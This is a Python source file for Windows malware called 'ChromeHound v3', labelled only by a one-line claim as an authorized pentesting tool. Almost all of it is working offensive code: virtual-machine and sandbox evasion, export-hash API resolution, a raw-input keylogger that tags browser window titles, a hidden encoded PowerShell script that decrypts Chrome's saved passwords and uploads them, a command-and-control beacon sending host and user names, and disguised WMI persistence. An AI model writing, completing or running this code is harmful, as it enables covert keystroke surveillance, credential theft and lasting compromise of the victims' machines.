"""
ChromeHound v3 — Fixed Raw Input + Full Evasion
Authorized pentesting tool.
"""
import ctypes, ctypes.wintypes, json, os, sys, time, threading, random, struct, base64, subprocess

class WinAPI:
    _cache = {}
    
    @classmethod
    def _mod(cls, name):
        if name not in cls._cache:
            h = ctypes.windll.kernel32.GetModuleHandleW(name)
            if not h:
                h = ctypes.windll.kernel32.LoadLibraryW(name)
            cls._cache[name] = h
        return cls._cache[name]
    
    @classmethod
    def fn(cls, mod, name, restype=ctypes.c_int, *argtypes):
        h = cls._mod(mod)
        if not h:
            return None
        addr = ctypes.windll.kernel32.GetProcAddress(h, name)
        if not addr:
            return None
        f = ctypes.CFUNCTYPE(restype, *argtypes)(addr) if argtypes else ctypes.CFUNCTYPE(restype)(addr)
        return f

    @classmethod
    def fn_hash(cls, mod, hash_val, restype=ctypes.c_int, *argtypes):
        h = cls._mod(mod)
        if not h:
            return None
        dos = ctypes.c_uint32.from_address(h).value
        e_lfanew = ctypes.c_uint32.from_address(h + 0x3C).value
        optional = h + e_lfanew + 0x18
        export_rva = ctypes.c_uint32.from_address(optional + 0x60).value
        if not export_rva:
            return None
        exp = h + export_rva
        n_names = ctypes.c_uint32.from_address(exp + 0x18).value
        addr_of_funcs = ctypes.c_uint32.from_address(exp + 0x1C).value
        addr_of_names = ctypes.c_uint32.from_address(exp + 0x20).value
        addr_of_ordinals = ctypes.c_uint32.from_address(exp + 0x24).value
        for i in range(n_names):
            name_rva = ctypes.c_uint32.from_address(h + addr_of_names + i * 4).value
            fname = ctypes.c_char_p(h + name_rva).value
            if fname:
                hval = 0
                for c in fname:
                    hval = (hval * 0x1003 + c) & 0xFFFFFFFF
                if hval == hash_val:
                    ordinal = ctypes.c_uint16.from_address(h + addr_of_ordinals + i * 2).value
                    func_rva = ctypes.c_uint32.from_address(h + addr_of_funcs + ordinal * 4).value
                    addr = h + func_rva
                    f = ctypes.CFUNCTYPE(restype, *argtypes)(addr) if argtypes else ctypes.CFUNCTYPE(restype)(addr)
                    return f
        return None


def _check_env():
    GetFirmware = WinAPI.fn("kernel32.dll", "GetSystemFirmwareTable", ctypes.c_uint32, 
                           ctypes.c_uint32, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_uint32)
    if GetFirmware:
        size = GetFirmware(0x4e, 1, None, 0) 
        if size:
            buf = ctypes.create_string_buffer(size)
            GetFirmware(0x4e, 1, buf, size)
            data = buf.raw
            for sig in [b"VMware", b"Virtual", b"VBOX", b"QEMU", b"Parallels", b"KVM"]:
                if sig in data:
                    time.sleep(random.uniform(10, 30))
                    return True
    GetDiskFree = WinAPI.fn("kernel32.dll", "GetDiskFreeSpaceExW", ctypes.c_int,
                           ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_ulonglong),
                           ctypes.POINTER(ctypes.c_ulonglong), ctypes.POINTER(ctypes.c_ulonglong))
    if GetDiskFree:
        free = ctypes.c_ulonglong()
        total = ctypes.c_ulonglong()
        GetDiskFree("C:\\", ctypes.byref(free), ctypes.byref(total), None)
        if total.value < 50000000000:
            time.sleep(random.uniform(8, 15))
            return True
    GetTick = WinAPI.fn("kernel32.dll", "GetTickCount", ctypes.c_uint32)
    if GetTick and GetTick() < 300000:
        time.sleep(random.uniform(10, 20))
        return True
    return False


# === FIX: Proper WNDCLASSW structure ===
class WNDCLASSW(ctypes.Structure):
    _fields_ = [
        ("style",        ctypes.c_uint32),
        ("lpfnWndProc",  ctypes.c_void_p),
        ("cbClsExtra",   ctypes.c_int),
        ("cbWndExtra",   ctypes.c_int),
        ("hInstance",    ctypes.c_void_p),
        ("hIcon",        ctypes.c_void_p),
        ("hCursor",      ctypes.c_void_p),
        ("hbrBackground",ctypes.c_void_p),
        ("lpszMenuName", ctypes.c_wchar_p),
        ("lpszClassName",ctypes.c_wchar_p),
    ]


class RawKeylogger:
    def __init__(self):
        self._buf = []
        self._lock = threading.Lock()
        self._running = True
        self._last_domain = ""
        self._hwnd = None

        self._RegisterRawInputDevices = WinAPI.fn("user32.dll","RegisterRawInputDevices",ctypes.c_bool,ctypes.c_void_p,ctypes.c_uint32,ctypes.c_uint32)
        self._GetRawInputData = WinAPI.fn("user32.dll","GetRawInputData",ctypes.c_uint32,ctypes.c_void_p,ctypes.c_uint32,ctypes.POINTER(ctypes.c_uint32),ctypes.c_uint32)
        self._DefWindowProcW = WinAPI.fn("user32.dll","DefWindowProcW",ctypes.c_void_p,ctypes.c_void_p,ctypes.c_uint32,ctypes.c_uint32,ctypes.c_uint32)
        self._CreateWindowExW = WinAPI.fn("user32.dll","CreateWindowExW",ctypes.c_void_p,ctypes.c_uint32,ctypes.c_wchar_p,ctypes.c_wchar_p,ctypes.c_uint32,ctypes.c_int,ctypes.c_int,ctypes.c_int,ctypes.c_int,ctypes.c_void_p,ctypes.c_void_p,ctypes.c_void_p,ctypes.c_void_p)
        self._GetMessageW = WinAPI.fn("user32.dll","GetMessageW",ctypes.c_int,ctypes.c_void_p,ctypes.c_void_p,ctypes.c_uint32,ctypes.c_uint32)
        self._TranslateMessage = WinAPI.fn("user32.dll","TranslateMessage",ctypes.c_int,ctypes.c_void_p)
        self._DispatchMessageW = WinAPI.fn("user32.dll","DispatchMessageW",ctypes.c_void_p,ctypes.c_void_p)
        self._GetForegroundWindow = WinAPI.fn("user32.dll","GetForegroundWindow",ctypes.c_void_p)
        self._GetWindowTextW = WinAPI.fn("user32.dll","GetWindowTextW",ctypes.c_int,ctypes.c_void_p,ctypes.c_int,ctypes.c_int)
        self._GetKeyState = WinAPI.fn("user32.dll","GetKeyState",ctypes.c_short,ctypes.c_int)
        self._DestroyWindow = WinAPI.fn("user32.dll","DestroyWindow",ctypes.c_int,ctypes.c_void_p)

    def _window_proc(self, hwnd, msg, wparam, lparam):
        if msg == 0x00FF:
            size = ctypes.c_uint32(0)
            self._GetRawInputData(lparam, 0x10000003, None, ctypes.byref(size), 8)
            if size.value:
                buf = ctypes.create_string_buffer(size.value)
                if self._GetRawInputData(lparam, 0x10000003, buf, ctypes.byref(size), 8) == size.value:
                    raw_size = struct.unpack_from('<I', buf, 4)[0]
                    if raw_size >= 24:
                        vk = struct.unpack_from('<H', buf, 24)[0]
                        flags = struct.unpack_from('<H', buf, 22)[0]
                        make_flag = (flags & 1) == 0
                        if vk and make_flag and vk != 0xFF:
                            self._log_key(vk)
        return self._DefWindowProcW(hwnd, msg, wparam, lparam)

    def _log_key(self, vk):
        if vk == 0x08: self._write("[BS]")
        elif vk == 0x09: self._write("[TAB]")
        elif vk == 0x0D: self._write("\n")
        elif vk == 0x1B: self._write("[ESC]")
        elif vk == 0x20: self._write(" ")
        elif vk == 0x2E: self._write("[DEL]")
        elif vk == 0x2D: self._write("[INS]")
        elif vk == 0x70: self._write("[F1]")
        elif vk == 0x71: self._write("[F2]")
        elif vk == 0x72: self._write("[F3]")
        elif vk == 0x73: self._write("[F4]")
        elif vk == 0x74: self._write("[F5]")
        elif vk == 0x75: self._write("[F6]")
        elif vk == 0x76: self._write("[F7]")
        elif vk == 0x77: self._write("[F8]")
        elif vk == 0x78: self._write("[F9]")
        elif vk == 0x79: self._write("[F10]")
        elif vk == 0x7A: self._write("[F11]")
        elif vk == 0x7B: self._write("[F12]")
        elif 0x41 <= vk <= 0x5A:
            shift = self._GetKeyState(0x10) & 0x8000 if self._GetKeyState else 0
            caps = self._GetKeyState(0x14) & 0x0001 if self._GetKeyState else 0
            uppercase = bool(shift) ^ bool(caps)
            self._write(chr(vk) if uppercase else chr(vk).lower())
        elif 0x30 <= vk <= 0x39:
            shift = self._GetKeyState(0x10) & 0x8000 if self._GetKeyState else 0
            special = ")!@#$%^&*("
            self._write(special[vk - 0x30] if shift else str(vk - 0x30))
        elif vk == 0xBE: self._write(">" if self._GetKeyState(0x10)&0x8000 else ".")
        elif vk == 0xBC: self._write("<" if self._GetKeyState(0x10)&0x8000 else ",")
        elif vk == 0xBF: self._write("?" if self._GetKeyState(0x10)&0x8000 else "/")
        elif vk == 0xBA: self._write(":" if self._GetKeyState(0x10)&0x8000 else ";")
        elif vk == 0xDE: self._write('"' if self._GetKeyState(0x10)&0x8000 else "'")
        elif vk == 0xDB: self._write("{" if self._GetKeyState(0x10)&0x8000 else "[")
        elif vk == 0xDD: self._write("}" if self._GetKeyState(0x10)&0x8000 else "]")
        elif vk == 0xDC: self._write("|" if self._GetKeyState(0x10)&0x8000 else "\\")
        elif vk == 0xC0: self._write("~" if self._GetKeyState(0x10)&0x8000 else "`")
        elif vk == 0xBD: self._write("_" if self._GetKeyState(0x10)&0x8000 else "-")
        elif vk == 0xBB: self._write("+" if self._GetKeyState(0x10)&0x8000 else "=")
        elif vk == 0x25: self._write("[←]")
        elif vk == 0x27: self._write("[→]")
        elif vk == 0x26: self._write("[↑]")
        elif vk == 0x28: self._write("[↓]")
        elif vk == 0x24: self._write("[HOME]")
        elif vk == 0x23: self._write("[END]")
        elif vk == 0x21: self._write("[PGUP]")
        elif vk == 0x22: self._write("[PGDN]")

    def _write(self, text):
        with self._lock:
            self._buf.append(text)

    def _title_watcher(self):
        while self._running:
            time.sleep(random.uniform(3.0, 5.0))
            try:
                hwnd = self._GetForegroundWindow()
                if hwnd:
                    buf = ctypes.create_unicode_buffer(256)
                    self._GetWindowTextW(hwnd, buf, 256)
                    title = buf.value
                    if title:
                        browsers = ["chrome","edge","firefox","brave","opera","gmail","outlook","mail"]
                        domain = ""
                        for b in browsers:
                            if b in title.lower():
                                parts = title.split(" - ")
                                domain = parts[0].strip()[:30] if parts else title[:30]
                                break
                        if domain and domain != self._last_domain:
                            self._last_domain = domain
                            self._write(f"\n── [{domain}] ──\n")
            except:
                pass

    def _sender(self, c2_url):
        while self._running:
            time.sleep(random.uniform(6.0, 10.0))
            with self._lock:
                if not self._buf:
                    continue
                content = "".join(self._buf)
                self._buf.clear()
            if content.strip():
                try:
                    import urllib.request
                    hostname = os.environ.get("COMPUTERNAME", "host")
                    data = json.dumps({"k": content[:2000],"h": hostname[:6],"t": int(time.time())}).encode()
                    req = urllib.request.Request(c2_url,data=data,headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
                    urllib.request.urlopen(req, timeout=5)
                except:
                    pass

    def start(self, c2_url):
        """Fixed: uses proper WNDCLASSW structure for RegisterClassW."""
        WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32,
                                     ctypes.c_uint32, ctypes.c_uint32)
        wndproc = WNDPROC(self._window_proc)

        # --- THIS IS THE FIX ---
        wc = WNDCLASSW()
        wc.style = 0
        wc.lpfnWndProc = ctypes.cast(wndproc, ctypes.c_void_p)
        wc.cbClsExtra = 0
        wc.cbWndExtra = 0
        hinst = WinAPI.fn("kernel32.dll","GetModuleHandleW",ctypes.c_void_p,ctypes.c_wchar_p)
        wc.hInstance = hinst(None) if hinst else 0
        wc.hIcon = 0
        wc.hCursor = 0
        wc.hbrBackground = 0
        wc.lpszMenuName = None
        wc.lpszClassName = "RawInputLoggerClass"

        atom = ctypes.windll.user32.RegisterClassW(ctypes.byref(wc))
        if not atom:
            print("RegisterClassW failed")
            return False

        hwnd = self._CreateWindowExW(0, "RawInputLoggerClass", "", 0,
                                     0, 0, 0, 0, None, None, None, None)
        if hwnd:
            self._hwnd = hwnd

        rid_dev = (ctypes.c_uint32 * 4)(0x01, 0x06, 0x00000100, hwnd if hwnd else 0)
        self._RegisterRawInputDevices(rid_dev, 1, ctypes.sizeof(ctypes.c_uint32) * 4)

        threading.Thread(target=self._title_watcher, daemon=True).start()
        threading.Thread(target=self._sender, args=(c2_url,), daemon=True).start()

        msg = (ctypes.c_uint32 * 6)()
        while self._running:
            ret = self._GetMessageW(msg, None, 0, 0)
            if ret <= 0:
                break
            self._TranslateMessage(msg)
            self._DispatchMessageW(msg)
        return True

    def stop(self):
        self._running = False
        if self._hwnd:
            try:
                self._DestroyWindow(self._hwnd)
            except:
                pass


def _steal_chrome_powershell(c2_url):
    ps_script = """$r=[System.Reflection.Assembly]::LoadWithPartialName('System.Security');$p=[Environment]::GetFolderPath('LocalApplicationData')+'\\Google\\Chrome\\User Data\\';$s=Get-Content($p+'Local State')|ConvertFrom-Json;$k=[System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($s.os_crypt.encrypted_key)[5..9999],$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);$db=$p+'Default\\Login Data';$t=$env:TEMP+'\\ld.tmp';Copy-Item $db $t -Force;$c=New-Object System.Data.SQLite.SQLiteConnection"Data Source=$t";$c.Open();$q=$c.CreateCommand();$q.CommandText='SELECT origin_url,username_value,password_value FROM logins';$r=$q.ExecuteReader();$o=@();while($r.Read()){$u=$r.GetString(0);$n=$r.GetString(1);$e=[byte[]]$r[2];if($e.Length -gt 15){$iv=$e[3..14];$ct=$e[15..($e.Length-17)];$tag=$e[-16..-1];$a=[System.Security.Cryptography.AesGcm]::new($k,16);$p=[byte[]]::new($ct.Length);$a.Decrypt($iv,$ct,$tag,$p);$o+=[PSCustomObject]@{url=$u;user=$n;pass=[System.Text.Encoding]::UTF8.GetString($p)}}$r.Close();$c.Close();$j=$o|ConvertTo-Json -Compress;$web=New-Object Net.WebClient;$web.Headers.Add('Content-Type','application/json');$web.UploadString('%s','POST',$j)"""
    cmd = ps_script % c2_url
    cmd_bytes = cmd.encode('utf-16-le')
    cmd_b64 = base64.b64encode(cmd_bytes).decode()
    si = subprocess.STARTUPINFO()
    si.dwFlags = subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0
    try:
        subprocess.run(
            ["powershell.exe", "-NoProfile", "-NonInteractive", "-EncodedCommand", cmd_b64],
            startupinfo=si,
            capture_output=True,
            timeout=30
        )
    except:
        pass


class C2:
    def __init__(self, endpoint):
        self._endpoint = endpoint
        self._hostname = os.environ.get("COMPUTERNAME", "UNKNOWN")
        self._username = os.environ.get("USERNAME", "UNKNOWN")
    
    def beacon(self):
        try:
            import urllib.request
            data = json.dumps({"type":"beacon","host":self._hostname,"user":self._username,"pid":os.getpid()}).encode()
            req = urllib.request.Request(self._endpoint+"/beacon",data=data,headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
            urllib.request.urlopen(req, timeout=5)
        except:
            pass
    
    def send_creds(self, creds):
        if not creds:
            return
        try:
            import urllib.request
            chunks = [creds[i:i+50] for i in range(0, len(creds), 50)]
            for chunk in chunks:
                data = json.dumps({"type":"creds","host":self._hostname,"user":self._username,"data":chunk}).encode()
                req = urllib.request.Request(self._endpoint+"/exfil",data=data,headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
                urllib.request.urlopen(req, timeout=5)
                time.sleep(random.uniform(1, 3))
        except:
            pass


def _install_persistence():
    wmi_script = (
        'wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE '
        'Name="MSFTEdgeDiag", EventNameSpace="root\\cimv2", '
        'QueryLanguage="WQL", '
        'Query="SELECT * FROM __InstanceModificationEvent WITHIN 86400 '
        'WHERE TargetInstance ISA \'Win32_ComputerSystem\'"'
    )
    try:
        subprocess.run(wmi_script, shell=True, capture_output=True, timeout=10)
    except:
        pass


def main():
    if _check_env():
        return

    C2_URL = "https://your-c2-endpoint.com/api"

    _install_persistence()

    c2 = C2(C2_URL)
    c2.beacon()

    kl = RawKeylogger()
    kl_thread = threading.Thread(target=kl.start, args=(C2_URL,), daemon=True)
    kl_thread.start()
    
    time.sleep(random.uniform(20, 40))
    _steal_chrome_powershell(C2_URL)
    
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        kl.stop()

if __name__ == "__main__":
    main()
